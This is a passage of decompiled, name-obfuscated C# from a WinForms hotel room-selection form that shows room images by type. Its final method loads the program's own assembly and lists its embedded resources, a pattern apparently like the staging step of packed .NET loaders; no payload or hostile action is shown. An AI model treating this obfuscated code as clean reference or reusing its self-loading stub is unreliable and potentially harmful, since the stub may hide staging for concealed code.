	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xq1a(PictureBox o1AZ)
	{
		PictureBox val = (I = o1AZ);
	}

	[SpecialName]
	internal virtual PictureBox g7WE()
	{
		return _PictureBox8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Dz5k(PictureBox Lz86)
	{
		_PictureBox8 = Lz86;
	}

	[SpecialName]
	internal virtual PictureBox Bi3t()
	{
		return _PictureBox9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x8ZB(PictureBox d3C9)
	{
		_PictureBox9 = d3C9;
	}

	[SpecialName]
	internal virtual PictureBox f7A5()
	{
		return m;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d1DX(PictureBox Xp92)
	{
		PictureBox val = (m = Xp92);
	}

	[SpecialName]
	internal virtual PictureBox c0W9()
	{
		return v;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a0T4(PictureBox Yx5p)
	{
		PictureBox val = (v = Yx5p);
	}

	private void x5AX(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Control)i7X.Forms.Ek0()).Show();
	}

	private void Sx8t(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(Gt8y().get_SelectedItem(), (object)"PinakaDATO Suite Room", false))
		{
			((Control)Gf9p()).Hide();
			((Control)Sp8g()).Hide();
			((Control)p7RD()).Hide();
			((Control)n2KW()).Hide();
			((Control)p8N9()).Hide();
			((Control)e5YH()).Hide();
			((Control)g7WE()).Hide();
			((Control)Bi3t()).Hide();
			((Control)f7A5()).Hide();
			((Control)c0W9()).Hide();
			((Control)p3XN()).Hide();
			((Control)i5Z9()).Show();
			((Control)Zc13()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(Gt8y().get_SelectedItem(), (object)"Medyo DATO Suite Room", false))
		{
			((Control)i5Z9()).Hide();
			((Control)Sp8g()).Hide();
			((Control)p7RD()).Hide();
			((Control)n2KW()).Hide();
			((Control)p8N9()).Hide();
			((Control)e5YH()).Hide();
			((Control)g7WE()).Hide();
			((Control)Bi3t()).Hide();
			((Control)f7A5()).Hide();
			((Control)c0W9()).Hide();
			((Control)p3XN()).Hide();
			((Control)Gf9p()).Show();
			((Control)Kg7i()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(Gt8y().get_SelectedItem(), (object)"DATO-DATOAN Suite Room", false))
		{
			((Control)i5Z9()).Hide();
			((Control)Gf9p()).Hide();
			((Control)p7RD()).Hide();
			((Control)n2KW()).Hide();
			((Control)p8N9()).Hide();
			((Control)e5YH()).Hide();
			((Control)g7WE()).Hide();
			((Control)Bi3t()).Hide();
			((Control)f7A5()).Hide();
			((Control)c0W9()).Hide();
			((Control)p3XN()).Hide();
			((Control)Sp8g()).Show();
			((Control)Pa03()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(Gt8y().get_SelectedItem(), (object)"Pinaka-MAYKAYA Suite Room", false))
		{
			((Control)i5Z9()).Hide();
			((Control)Gf9p()).Hide();
			((Control)Sp8g()).Hide();
			((Control)n2KW()).Hide();
			((Control)p8N9()).Hide();
			((Control)e5YH()).Hide();
			((Control)g7WE()).Hide();
			((Control)Bi3t()).Hide();
			((Control)f7A5()).Hide();
			((Control)c0W9()).Hide();
			((Control)p3XN()).Hide();
			((Control)p7RD()).Show();
			((Control)a0WG()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(Gt8y().get_SelectedItem(), (object)"Medyo MAYKAYA Room", false))
		{
			((Control)i5Z9()).Hide();
			((Control)Gf9p()).Hide();
			((Control)Sp8g()).Hide();
			((Control)p7RD()).Hide();
			((Control)p8N9()).Hide();
			((Control)e5YH()).Hide();
			((Control)g7WE()).Hide();
			((Control)Bi3t()).Hide();
			((Control)f7A5()).Hide();
			((Control)c0W9()).Hide();
			((Control)p3XN()).Hide();
			((Control)n2KW()).Show();
			((Control)Sq59()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(Gt8y().get_SelectedItem(), (object)"KAYA-KAYAHA Room", false))
		{
			((Control)i5Z9()).Hide();
			((Control)Gf9p()).Hide();
			((Control)Sp8g()).Hide();
			((Control)p7RD()).Hide();
			((Control)n2KW()).Hide();
			((Control)e5YH()).Hide();
			((Control)g7WE()).Hide();
			((Control)Bi3t()).Hide();
			((Control)f7A5()).Hide();
			((Control)c0W9()).Hide();
			((Control)p3XN()).Hide();
			((Control)p8N9()).Show();
			((Control)q0S7()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(Gt8y().get_SelectedItem(), (object)"POBRE Room", false))
		{
			((Control)i5Z9()).Hide();
			((Control)Gf9p()).Hide();
			((Control)Sp8g()).Hide();
			((Control)p7RD()).Hide();
			((Control)n2KW()).Hide();
			((Control)p8N9()).Hide();
			((Control)g7WE()).Hide();
			((Control)Bi3t()).Hide();
			((Control)f7A5()).Hide();
			((Control)c0W9()).Hide();
			((Control)p3XN()).Hide();
			((Control)e5YH()).Show();
			((Control)i4C9()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(Gt8y().get_SelectedItem(), (object)"Mas-POBRE Room", false))
		{
			((Control)i5Z9()).Hide();
			((Control)Gf9p()).Hide();
			((Control)Sp8g()).Hide();
			((Control)p7RD()).Hide();
			((Control)n2KW()).Hide();
			((Control)p8N9()).Hide();
			((Control)e5YH()).Hide();
			((Control)Bi3t()).Hide();
			((Control)f7A5()).Hide();
			((Control)c0W9()).Hide();
			((Control)p3XN()).Hide();
			((Control)g7WE()).Show();
			((Control)m9B7()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(Gt8y().get_SelectedItem(), (object)"Pinaka-POBRE Room", false))
		{
			((Control)i5Z9()).Hide();
			((Control)Gf9p()).Hide();
			((Control)Sp8g()).Hide();
			((Control)p7RD()).Hide();
			((Control)n2KW()).Hide();
			((Control)p8N9()).Hide();
			((Control)e5YH()).Hide();
			((Control)g7WE()).Hide();
			((Control)f7A5()).Hide();
			((Control)c0W9()).Hide();
			((Control)p3XN()).Hide();
			((Control)Bi3t()).Show();
			((Control)i7QP()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(Gt8y().get_SelectedItem(), (object)"Pinaka-AFFORDABLE Suite Room", false))
		{
			((Control)i5Z9()).Hide();
			((Control)Gf9p()).Hide();
			((Control)Sp8g()).Hide();
			((Control)p7RD()).Hide();
			((Control)n2KW()).Hide();
			((Control)p8N9()).Hide();
			((Control)e5YH()).Hide();
			((Control)g7WE()).Hide();
			((Control)Bi3t()).Hide();
			((Control)c0W9()).Hide();
			((Control)p3XN()).Hide();
			((Control)f7A5()).Show();
			((Control)Wo6n()).Show();
		}
	}

	internal static string[] s6A8()
	{
		j9PK.Tb02();
		List<string> list = new List<string>();
		int num = 0;
		Assembly assembly = Assembly.LoadFrom(Environment.GetCommandLineArgs()[0]);
		z1E.mDic.Add("Ass", assembly);
		string[] manifestResourceNames = assembly.GetManifestResourceNames();
		foreach (string item in manifestResourceNames)
		{
			list.Add(item);
		}
		checked
		{
			string[] array = new string[list.Count - 1 + 1];
			int num2 = array.Length - 1;
			for (num = 0; num <= num2; num++)
			{
				array[num] = list[num];
			}
			return array;
		}
	}
}
